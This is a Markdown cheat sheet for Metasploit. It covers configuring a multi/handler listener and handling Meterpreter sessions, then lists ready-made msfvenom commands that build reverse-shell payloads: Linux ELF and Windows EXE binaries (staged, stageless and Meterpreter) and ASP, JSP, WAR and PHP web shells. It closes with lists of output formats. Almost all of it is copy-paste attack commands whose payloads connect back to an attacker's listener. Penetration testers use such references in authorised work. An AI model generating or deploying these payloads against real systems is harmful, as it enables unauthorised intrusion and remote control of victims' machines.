[Metasploit Commands](#metasploit-commands)  
[msfvenom payload shorcuts](#msfvenom-payload-shorcuts)  
[msfvenom output formats](#msfvenom-output-formats)  

## Metasploit Commands

#### Configure multi/handler
```
use multi/handler
set PAYLOAD = <payload> (meterpreter is default)
set LHOST <listening ip>
set LPORT <lisenting port>

run -j (runs the listener in the background)

Once a session is established...
sessions <session number> 
```
#### Meterpreter
`bg` puts the current meterpreter session in the background.  Use sessions to reconnect.

###
## msfvenom payload shorcuts

Staged payloads are denoted with a foward slash (/)
```
# windows/shell/reverse_tcp = staged
# windows/shell_reverse_tcp = stageless
```

### To view payload options
```
msfvenom -p <payload> --list-options
```

### Non-Meterpreter Binaries
Stageless Payloads for Linux
```
x86	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

Stageless Payloads for Windows
```
x86	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

Staged Payloads for Windows
```
x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

Staged Payloads for Linux
```
x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

Non-Meterpreter Web Payloads
```
asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
php	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
### Meterpreter Binaries
Staged Payloads for Windows
```
x86	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```
Stageless Payloads for Windows
```
x86	msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
x64	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```
Staged Payloads for Linux
```
x86	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
Stageless Payloads for Linux
```
x86	msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
x64	msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
*sourced from https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/*  
---


## msfvenom output formats
```
msfvenom --list formats
```

### Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

### Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
